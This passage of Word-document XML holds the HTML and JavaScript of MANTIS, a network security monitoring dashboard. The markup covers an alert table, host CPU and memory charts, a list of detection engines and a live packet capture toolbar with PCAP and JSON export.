    <w:p w14:paraId="4FEE8D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riskColour = risk &gt;= 8 ? 'var(--accent-red)'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC518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: risk &gt;= 5 ? 'var(--accent-orange)' : 'var(--accent-green)';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4E749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DB7C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source = alert.src_ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="704DBE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? `${alert.sensor} &lt;span style="color:#475569"&gt;&amp;larr;&lt;/span&gt; ${alert.src_ip}`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A230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: alert.sensor;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761E793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1D6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let row = `&lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="244313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&lt;td&gt;&lt;span class="badge ${sevClass}"&gt;${alert.severity}&lt;/span&gt;&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C416B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 class="mono" style="color:#94a3b8"&gt;${alert.time}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C2D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 class="mono" style="color:var(--accent-blue)"&gt;${source}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327C47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&lt;td&gt;${tech}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D0C8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 class="mono" style="color:${riskColour}; font-weight:700"&gt;${risk.toFixed(1)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A8DB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&lt;td&gt;${alert.message}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40EB21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&lt;/tr&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="176E6B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tbody.innerHTML += row;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022889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});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681FA6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214055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0E9F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setInterval(fetchStats, 1000);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181AA8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setInterval(fetchPackets, 800);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CF9E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window.onload = () =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F258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initCharts();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004800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fetchStats();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6540B1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fetchPackets();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE10E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};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF1A6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&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A89D7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&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1524A1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51C3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&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D1EE0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A4AE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&lt;!-- Sidebar nav --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28CED9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&lt;div class="sidebar"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2269A1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class="logo-container"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495C63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class="brand-mark" aria-hidden="true"&gt;M&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78620F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&lt;div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F4A2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&lt;h1&gt;MANTIS&lt;/h1&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180EC7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class="logo-subtitle"&gt;Network security monitor&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A133B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1EE5CE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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71372A8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6748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class="nav-menu" role="tablist" aria-label="Dashboard sections"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="516086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class="nav-label"&gt;Monitoring&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F07BA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&lt;button type="button" class="nav-item active" role="tab" aria-selected="true"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6696E1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aria-controls="tab-overview" onclick="switchTab('tab-overview')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455BBC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&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4B21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&lt;rect x="3" y="3" width="7" height="7"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C42F5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&lt;rect x="14" y="3" width="7" height="7"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCAB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&lt;rect x="14" y="14" width="7" height="7"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E195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&lt;rect x="3" y="14" width="7" height="7"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C754A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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA799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Overview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AABA7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&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763503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&lt;button type="button" class="nav-item" role="tab" aria-selected="false"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ADAEF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aria-controls="tab-packets" onclick="switchTab('tab-packets')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C153C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&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BDEC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&lt;polyline points="22 12 18 12 15 21 9 3 6 12 2 12"&gt;&lt;/polyline&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622CEF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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E26A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Packet capture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390E10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&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B91BA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&lt;button type="button" class="nav-item" role="tab" aria-selected="false"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509C0A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aria-controls="tab-alerts" onclick="switchTab('tab-alerts')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3B43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&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35AAEB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&lt;path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791FB4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&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505E25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&lt;line x1="12" y1="9" x2="12" y2="13"&gt;&lt;/line&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E07D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&lt;line x1="12" y1="17" x2="12.01" y2="17"&gt;&lt;/line&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2E65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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68068C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Threat activity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3D74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&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A04D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&lt;button type="button" class="nav-item" role="tab" aria-selected="false"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBE9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aria-controls="tab-architecture" onclick="switchTab('tab-architecture')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714B85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&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794EE5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&lt;path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"&gt;&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C984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&lt;polyline points="14 2 14 8 20 8"&gt;&lt;/polyline&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EC1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&lt;line x1="16" y1="13" x2="8" y2="13"&gt;&lt;/line&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D2EC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&lt;line x1="16" y1="17" x2="8" y2="17"&gt;&lt;/line&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BFB1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&lt;polyline points="10 9 9 9 8 9"&gt;&lt;/polyline&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F8BF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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED2BC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System design</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A14E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&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185F8C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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248FE0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B1BF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class="sidebar-session" aria-label="Current monitoring session"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44039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class="session-heading"&gt;&lt;span class="session-dot"&gt;&lt;/span&gt;Current session&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59AF8D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class="session-row"&gt;&lt;span&gt;Sensors online&lt;/span&gt;&lt;strong id="sidebarSensorCount"&gt;0&lt;/strong&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC2D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class="session-row"&gt;&lt;span&gt;Packets buffered&lt;/span&gt;&lt;strong id="sidebarPacketCount"&gt;0&lt;/strong&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AEE8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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7809E1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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1C684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D94C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&lt;div class="main-content"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356ADC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&lt;header&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA75C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class="header-copy"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="328EDB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&lt;h1 id="headerTitle"&gt;Security overview&lt;/h1&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8CC8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 id="headerSubtitle"&gt;Live host health, sensor status and detection activity&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE600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6EBA04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class="header-status"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714014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class="last-updated" id="lastUpdatedText"&gt;Waiting for telemetry&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425237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class="status-badge" role="status" aria-live="polite"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672D8B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class="pulse-dot"&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594166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&lt;span id="statusText"&gt;System operational&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0775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62263B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6FCFF6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&lt;/header&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182778A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4C72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&lt;!-- TAB 1: OVERVIEW --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D1EF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id="tab-overview" class="tab-content active" role="tabpanel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D40D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class="content-width"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1E15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class="section-heading"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3BB1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&lt;div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100E14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&lt;h2&gt;System health&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074260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&lt;p&gt;Current resource use and monitoring coverage&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188024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06FA6E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class="refresh-note"&gt;Refreshes every second&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506876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52884D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class="metrics-grid"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52185A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class="card top-acc-blue"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5EA2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class="card-header" style="justify-content: space-between; align-items: center; display:flex;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4898D3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&lt;span&gt;Host CPU load&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F078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&lt;svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="095B67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stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12989F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&lt;path d="M18 20V10"&gt;&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043DB0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&lt;path d="M12 20V4"&gt;&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA457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&lt;path d="M6 20V14"&gt;&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BAB0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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790F89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6410A6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class="metric-value"&gt;&lt;span id="cpuVal"&gt;0.0&lt;/span&gt;&lt;span class="metric-unit"&gt;%&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD9F9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class="chart-container"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E487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&lt;canvas id="cpuChartCanvas"&gt;&lt;/canvas&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D03C2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3439B7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254A7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class="card" style="border-top: 3px solid var(--accent-purple);"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BC3F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class="card-header" style="justify-content: space-between; align-items: center; display:flex;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D2B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&lt;span&gt;Host memory use&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123ADD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&lt;svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7748B8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stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD525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&lt;rect x="2" y="3" width="20" height="14" rx="2" ry="2"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B057F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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF35A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3EF2A3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class="metric-value"&gt;&lt;span id="memVal"&gt;0.0&lt;/span&gt;&lt;span class="metric-unit"&gt;%&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D76B0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class="chart-container"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6D54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&lt;canvas id="memChartCanvas"&gt;&lt;/canvas&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764131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3E05BE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7D7227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class="card top-acc-green"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F54F7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class="card-header"&gt;Sensors online &lt;svg width="14" height="14" viewBox="0 0 24 24" fill="none"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19ABD9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stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C924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&lt;rect x="2" y="2" width="20" height="8" rx="2" ry="2"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8528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&lt;/svg&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626BD3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class="metric-value"&gt;&lt;span id="sensorVal"&gt;0&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA95E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class="metric-meta"&gt;&lt;span class="state-dot"&gt;&lt;/span&gt;Seen within the last 60 seconds&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459483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6D92F2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class="card top-acc-red"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39749E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class="card-header"&gt;Threat events &lt;svg width="14" height="14" viewBox="0 0 24 24"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EAE1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fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D79F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&lt;path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351241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d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1859E1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&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B286E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&lt;/svg&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6927E9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class="metric-value"&gt;&lt;span id="totalEventsVal"&gt;0&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B31FD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class="metric-meta alert"&gt;&lt;span class="state-dot"&gt;&lt;/span&gt;Current in-memory event window&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E9D0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2FF035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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4A3D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250C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class="section-heading"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C4CE2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&lt;div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C988D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&lt;h2&gt;Detection activity&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636AF0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&lt;p&gt;Latest classified events and engine output&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A2AD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33E100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59E1F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class="overview-grid"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC314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class="table-card"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500512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class="table-header table-header-split"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9D97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&lt;div&gt;Recent events&lt;span class="table-kicker"&gt;Newest detections appear first&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CBF7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 class="refresh-note"&gt;LIVE&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DF1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423F8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class="table-scroll"&gt;&lt;table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193C54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&lt;thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A74E0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&lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E72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&lt;th&gt;Sev&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3009F4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&lt;th&gt;Time&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F743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&lt;th&gt;Sensor &amp;larr; Source&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E558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&lt;th&gt;ATT&amp;amp;CK&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4981CA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&lt;th&gt;Risk&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1330FF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&lt;th&gt;Event Details&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B88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&lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182697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&lt;/thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8154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&lt;tbody id="alertTableBody"&gt;&lt;/tbody&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B82B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&lt;/table&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711A60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1BF6728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94DA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class="table-card engine-panel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619E56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class="table-header"&gt;Detection engines&lt;span class="table-kicker"&gt;Events by analysis method&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127AF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class="engine-list"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128AFF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&lt;div class="engine-row"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7965EC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&lt;span class="engine-marker red"&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562855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&lt;div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="645ECA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class="engine-name"&gt;Traffic anomaly&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237D91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class="engine-model"&gt;Z-Score, DDoS detection&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233A64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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121DF1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 class="engine-count" id="ddosCount"&gt;0&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BC7D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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573367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13E3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&lt;div class="engine-row"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17FCCE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&lt;span class="engine-marker orange"&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589AB8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&lt;div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42AEA4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class="engine-name"&gt;Scan behaviour&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E880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class="engine-model"&gt;KNN and K-Means&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3285B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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0833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 class="engine-count" id="scanCount"&gt;0&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B99A0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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9C1C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0802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&lt;div class="engine-row"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455532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&lt;span class="engine-marker purple"&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708813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&lt;div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F58D2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class="engine-name"&gt;Payload inspection&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D83EF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class="engine-model"&gt;Naive Bayes, application layer&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4988C6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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2435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 class="engine-count" id="payloadCount"&gt;0&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B15E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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D7079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4A20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&lt;div class="engine-row"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD8BA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&lt;span class="engine-marker"&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5174C7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&lt;div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081C4C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class="engine-name"&gt;IP reputation&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BA32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&lt;div class="engine-model"&gt;Bloom filter blacklist&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="422F57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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D38BF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&lt;div class="engine-count" id="blacklistCount"&gt;0&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750AA9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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351BBE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04742C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77E286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485533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079A06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 &lt;!-- End of tab-overview --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0076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CE9B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&lt;!-- TAB 2: WIRESHARK PACKETS --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60386A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id="tab-packets" class="tab-content" role="tabpanel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4AA7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class="content-width"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF8A9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class="page-intro"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678571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&lt;h2&gt;Live packet capture&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0554C8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&lt;p&gt;Packets are captured through Python raw sockets and stored temporarily in memory. Select a row to inspect the frame data or export the current buffer for independent analysis.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A59C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0C8124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53FA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&lt;div class="pkt-toolbar"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBDEB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&lt;input type="text" aria-label="Filter captured packets" placeholder="Filter by IP, port or packet details"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A060F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oninput="setQueryFilter(this.value)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7589C2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&lt;select onchange="setProtoFilter(this.value)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4107D6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&lt;option value="ALL"&gt;All protocols&lt;/option&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64AEE7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&lt;option value="TCP"&gt;TCP&lt;/option&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E23A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&lt;option value="UDP"&gt;UDP&lt;/option&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F6D8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&lt;option value="ICMP"&gt;ICMP&lt;/option&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D54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&lt;/select&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="465DAF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&lt;button class="pkt-btn" id="pktPauseBtn" onclick="togglePause()"&gt;Pause&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132E5D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&lt;label class="pkt-btn" style="cursor:default;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D47E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&lt;input type="checkbox" checked onchange="toggleAutoScroll(this)"&gt; Auto-scroll</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F634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&lt;/label&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3AFF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&lt;a class="pkt-btn primary" href="/api/export.pcap" download</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385F20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aria-label="Export .pcap (Wireshark)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347292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title="Download the live buffer as a libpcap file and open it in Wireshark"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6E21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&gt;Export PCAP&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E04B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&lt;a class="pkt-btn" href="/api/export" download&gt;Export JSON&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76EE15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class="pkt-chip"&gt;TCP &lt;b id="pcTCP"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BBC6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class="pkt-chip"&gt;UDP &lt;b id="pcUDP"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB78E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class="pkt-chip"&gt;ICMP &lt;b id="pcICMP"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D61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class="pkt-chip"&gt;PPS &lt;b id="ppsVal"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C87A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&lt;span class="pkt-chip"&gt;Z-Score &lt;b id="zVal"&gt;0.00&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1E4B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7B36BD7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102A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class="table-card"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D3A11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class="table-header"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B059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style="background: #111827; border-bottom: 2px solid var(--accent-blue); display:flex; justify-content:space-between;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537707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&lt;span class="mono" style="font-size: 10px; color: var(--accent-blue);"&gt;AF_PACKET live capture&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185781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&lt;span class="mono" style="font-size: 10px; color: var(--text-muted);"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7014BE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buffered &lt;b id="pktBuffered" style="color:var(--accent-green)"&gt;0&lt;/b&gt; /</w:t>
      </w:r>
    </w:p>
